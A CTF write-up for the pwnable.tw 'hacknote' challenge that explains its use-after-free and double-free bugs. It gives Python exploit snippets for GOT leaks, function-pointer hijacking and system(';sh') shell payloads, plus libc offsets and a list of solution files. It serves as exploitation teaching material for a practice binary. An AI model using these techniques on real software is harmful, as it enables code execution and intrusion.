---
tags:
  - use-after-free
  - got-overwrite
  - ret2libc
platform: pwnable.tw
points: 150
arch: i386
libc: glibc-2.23
relro: partial
canary: yes
nx: yes
pie: no
references:
  - https://pwnable.tw/challenge/
description: "A use-after-free in note management allows reallocating user data into note metadata chunks, overwriting the print function pointer to call system."
proof-of-concept: no
---

# hacknote — pwnable.tw (150 pts)

[← Back to pwnable.tw Challenge Index](README.md)

> `nc chall.pwnable.tw 10102`
>
> Flag: `FLAG{...}` (dynamic)

## Challenge Overview

A classic heap-note management binary (i386, No PIE, Partial RELRO, NX, Stack Canary) built against glibc 2.23 (32-bit). The program provides four operations: Add Note, Delete Note, Print Note, and Exit. Each note consists of a **metadata struct** (with a function pointer) and a separate **content buffer**, both heap-allocated.

```
checksec:
  Arch:     i386-32-little
  RELRO:    Partial RELRO        # GOT writable
  Stack:    Canary found
  NX:       NX enabled
  PIE:      No PIE               # fixed addresses
```

## Program Structure

The program maintains a global array `notelist[5]` of note pointers and a `count` variable. Each note is represented by two heap allocations:

### Note Metadata Struct (8 bytes, `malloc(8)`)

| Offset | Field | Type |
|--------|-------|------|
| `0x00` | `print_func` | `void (*)(note *)` — function pointer called during Print Note |
| `0x04` | `content` | `char *` — pointer to the content buffer |

### Operations (Pseudocode)

```c
// Add Note (option 1)
void add_note() {
    if (count > 5) return;
    note *p = malloc(8);              // metadata struct
    p->print_func = 0x0804862B;       // default: prints content via puts()
    printf("Note size :"); scanf("%d", &size);
    p->content = malloc(size);        // content buffer
    printf("Content :"); read(0, p->content, size);
    notelist[count++] = p;
}

// Delete Note (option 2)  — VULNERABLE
void delete_note() {
    printf("Index :"); scanf("%d", &idx);
    if (idx < 0 || idx >= count) { puts("Out of bound!"); return; }
    if (notelist[idx]) {
        free(notelist[idx]->content);  // free content
        free(notelist[idx]);           // free metadata
        // BUG: notelist[idx] is NOT set to NULL
    }
}

// Print Note (option 3)  — triggers function pointer call
void print_note() {
    printf("Index :"); scanf("%d", &idx);
    if (idx < 0 || idx >= count) { puts("Out of bound!"); return; }
    if (notelist[idx])
        notelist[idx]->print_func(notelist[idx]);  // calls func ptr with struct as arg
}
```

## Vulnerabilities

### V1 — Use-After-Free (Primary, Exploitable)

**Root Cause:** `delete_note()` calls `free()` on both the content buffer and the metadata struct but **does not set `notelist[idx]` to NULL**. The dangling pointer remains in the global array.

```c
free(notelist[idx]->content);
free(notelist[idx]);
// notelist[idx] = NULL;   ← MISSING
```

**Impact:** After deletion, calling `print_note(idx)` on the freed index still dereferences `notelist[idx]`, reads the function pointer at offset `+0x00`, and calls it with the struct address as the argument. If the freed chunk has been reallocated and its contents overwritten, the attacker controls the function pointer and its argument.

### V2 — Double Free (Variant of V1)

Since `notelist[idx]` is never NUL'd, `delete_note(idx)` can be called **multiple times** on the same index, causing a double-free. This corrupts the fastbin freelist and enables fastbin dup attacks. Several solutions exploit this variant instead of the basic UAF.

### V3 — No Allocation Limit Enforcement

The `count` variable only increments, never decrements on delete. Combined with the limit of 5, this restricts total allocations but doesn't prevent UAF/double-free on already-freed notes.

## Key Addresses (Fixed, No PIE)

```python
NOTE_PRINT_FUNC = 0x0804862B   # default print function (calls puts on content)
PUTS_GOT        = 0x0804A024   # puts@GOT
READ_GOT        = 0x0804A00C   # read@GOT
PRINTF_GOT      = 0x0804A010   # printf@GOT
FREE_GOT        = 0x0804A034   # free@GOT
```

## Exploit Paths

All solutions exploit V1 (UAF) or V2 (double free). The core technique is the same: reallocate a freed note's metadata chunk with attacker-controlled data to hijack the function pointer. They differ in how the heap is set up and which libc function is leaked.

---

### Path A — Fastbin UAF: Leak GOT via `print_func` + `system(";sh")`

**Used by:** ~90% of all solutions (100, 138, 1155, 1251, 1269, 1297, 1303, 1387, 10453, 11699, 12705, 13060, exp.py, etc.)

This is the canonical solution and the simplest heap exploit pattern.

**Steps:**

1. **Allocate two notes** with small content sizes (8–32 bytes). Both metadata structs (8 bytes) and content buffers land in the same fastbin size class.

```python
add(16, "A"*16)   # note[0]: metadata=malloc(8), content=malloc(16)
add(16, "B"*16)   # note[1]: metadata=malloc(8), content=malloc(16)
```

2. **Free both notes.** The fastbin freelist for the 0x10 bin (8-byte usable) now contains:
```
fastbin[0x10]: note1_meta → note0_meta → note1_content → note0_content
```
(Exact order depends on content size; with size 16, content goes to a different bin.)

3. **Allocate a new note with content size 8.** The metadata struct `malloc(8)` consumes `note1_meta` from the fastbin; the content `malloc(8)` consumes `note0_meta`. Now writing content overwrites `note[0]`'s (freed) metadata:

```python
add(8, p32(0x0804862B) + p32(PUTS_GOT))
#       ^print_func        ^"content" = puts@GOT
```

4. **Print note[0]** (the freed/dangling pointer). This calls `0x0804862B(note0_meta)` which executes `puts(*(note0_meta+4))` = `puts(puts@GOT)` → leaks the runtime address of `puts`.

```python
show(0)
puts_addr = u32(recv(4))
libc_base = puts_addr - libc.symbols['puts']
system = libc_base + libc.symbols['system']
```

5. **Free the new note, reallocate with `system` + `";sh"`:**

```python
delete(2)
add(8, p32(system) + b";sh\x00")
```

6. **Print note[0] again.** This calls `system(note0_meta)` which executes `system("\xXX\xXX\xXX\xXX;sh\x00")`. The first 4 bytes (the address of `system` itself) produce a command-not-found error, but **`;sh`** starts a shell via command chaining.

**Why `;sh` works:** `system()` invokes `/bin/sh -c <arg>`. The argument is the entire 8-byte struct starting at offset 0: `p32(system) + ";sh\x00"`. The shell sees two commands separated by `;` — the first (binary garbage) fails silently, the second (`sh`) spawns an interactive shell. Alternatives seen in solutions: `"||sh"`, `"&&sh"`, `"; cat /home/hacknote/flag;"`, `";/bin/sh\x00"`.

**Reliability:** 100% — deterministic, no brute force needed.

---

### Path B — Unsorted Bin Leak + Fastbin UAF

**Used by:** Solutions 1220, 10115, 10453, 12245, 14032

For notes with content size ≥ 0x80 (outside fastbin range), `free()` places chunks into the **unsorted bin**, which stores `fd`/`bk` pointers into `main_arena` (libc). This provides an alternative libc leak.

**Steps:**

1. **Allocate a large note** (content size ≥ 0x80, e.g., 0x80 or 0x400) and a guard note to prevent top-chunk consolidation.
2. **Free the large note.** Content chunk goes to the unsorted bin; its `fd`/`bk` now point to `main_arena+X`.
3. **Reallocate** the same size. The content buffer is served from the unsorted bin. Read back 4 bytes past the user-written data to leak the `fd` pointer.
4. **Calculate libc base** from `main_arena` offset.
5. **Proceed with fastbin UAF** (Path A steps 1-6) to get code execution.

```python
add(0x80, "A")           # note[0] — large content
add(0x20, "B")           # note[1] — guard (prevents consolidation with top)
delete(0)                 # content goes to unsorted bin
add(0x80, "XXXX")        # reallocate; read back unsorted bin fd
show(0)                   # leak: 4 bytes of data + 4 bytes of fd pointer
libc_base = u32(recv(4)[4:8]) - main_arena_offset
```

---

### Path C — Large Allocation Overlap

**Used by:** Solutions 1006, 1126, 1236, 10128

Instead of matching fastbin sizes, some solutions use a large allocation that overlaps multiple freed small note structs.

**Steps:**

1. **Allocate two notes** with medium content (128–1000 bytes).
2. **Free both notes.**
3. **Allocate a new note with large content** (e.g., 1000+ bytes). The content buffer spans the memory where the old note metadata structs were. Padding + controlled data at the right offset overwrites the old function pointer fields.

```python
add(500, "A"*500)   # note[0]
add(500, "B"*500)   # note[1]
delete(1)
delete(0)
# note[0] metadata was at heap+X; with large alloc, content buffer covers it
add(1000, "P"*504 + p32(0x0804862B) + p32(PUTS_GOT))
show(1)              # triggers UAF on freed note[1]
```

The offset to the function pointer depends on chunk sizes and heap layout (commonly 504 or 1008 bytes of padding, found via cyclic pattern). Less elegant than Path A but still reliable.

---

### Path D — Double Free Fastbin Dup

**Used by:** Solutions 1303, 1316, 1384, 11540

Explicitly trigger double-free on the same index to corrupt the fastbin freelist.

```python
add(8, "sh\x00\x00")   # note[0]
add(8, "sh\x00\x00")   # note[1]
delete(0)
delete(1)
delete(0)               # double free! fastbin: note0 → note1 → note0 → ...
```

This creates a cycle in the fastbin. Subsequent allocations return the same chunks repeatedly, allowing controlled overwrites. The rest proceeds like Path A.

## Exploit Primitive Summary

| Primitive | Source | Reliability |
|-----------|--------|-------------|
| Use-After-Free | V1: dangling pointer in `notelist[]` | Deterministic |
| Double Free | V2: no NULL after free | Deterministic |
| Function pointer hijack | UAF: overwrite `print_func` in reused chunk | Deterministic |
| libc leak (GOT read) | Call `puts(GOT_entry)` via hijacked `print_func` | Deterministic |
| libc leak (unsorted bin) | Read `main_arena` pointer from freed large chunk | Deterministic |
| Code execution | `system(";sh")` via hijacked `print_func` | Deterministic |

## Offsets (pwnable.tw `libc_32.so.6`, glibc 2.23, 32-bit)

```python
puts        = 0x05f140
system      = 0x03a940
read        = 0x0d41c0
printf      = 0x049010
free        = 0x070750
main_arena  = 0x1b07b0
bin_sh      = 0x158e8b
```

## Solution Write-ups

| File | Primary Path | Key Technique | Notes |
|------|-------------|---------------|-------|
| `exp.py` | A | Fastbin UAF → GOT leak → `system(";sh")` | Clean minimal exploit |
| `100.md` | A | Fastbin UAF, leak via `__libc_start_main` GOT | Python 2 |
| `138.md` | A | Fastbin UAF → `system(";/bin/sh;")` | Ruby implementation |
| `1006.md` | C | Large alloc overlap (1000 bytes), leak stdout | Offset 504/1008 padding |
| `1126.md` | C | Large alloc overlap, format string `%19$p` for stack leak | Unique: uses `printf` as print_func for stack leak |
| `1155.md` | A | Fastbin UAF, content size 20 | Minimal |
| `1220.md` | B | Unsorted bin leak via `main_arena`, large alloc overlap | Two-phase: unsorted leak + fastbin hijack |
| `1236.md` | C | Large alloc (1000), heap base leak + libc leak | Multi-step with heap spray |
| `1251.md` | A | Fastbin UAF, named function `FUCK` | Concise, well-commented |
| `1269.md` | A | Fastbin UAF, leak via `read@GOT` | Standard |
| `1297.md` | A | Fastbin UAF, checksec output included | Shows binary protections |
| `1303.md` | D | Double free → fastbin dup | Explicitly frees same index twice |
| `1316.md` | D | Double free, extra alloc for dedup | Uses 3 allocs after double free |
| `1351.md` | A | Fastbin UAF, heap leak via `count` global | Also leaks heap address |
| `1384.md` | D | Double free fastbin cycle | Explicit `a→b→a` cycle |
| `10115.md` | B | Unsorted bin leak + double free | Combines both techniques |
| `10128.md` | C | Large overlap, detailed walkthrough | Best narrative writeup |
| `10453.md` | B + A | Unsorted bin leak, then fastbin | Japanese, concise |
| `11540.md` | D | Double free, raw `send` with `%04d` formatting | Unusual I/O style |
| `12245.md` | B | Unsorted bin leak `main_arena+0x30` | Chinese, good explanation of UAF |
| `12705.md` | A | Standard, uses 32-byte notes | Clean Python 2 |
| `13060.md` | A | Standard, uses `puts@GOT` | Modern Python 3 |

## Files

| File | Description |
|------|-------------|
| `exp.py` | Working exploit script (vanilla Python, no pwntools) |
| `desc.txt` | Challenge description |
| `artifacts/hacknote` | Original challenge binary (i386, stripped) |
| `artifacts/libc_32.so.6` | Remote libc (glibc 2.23, 32-bit) |
| `solution/*.md` | Community write-ups (218 solutions) |
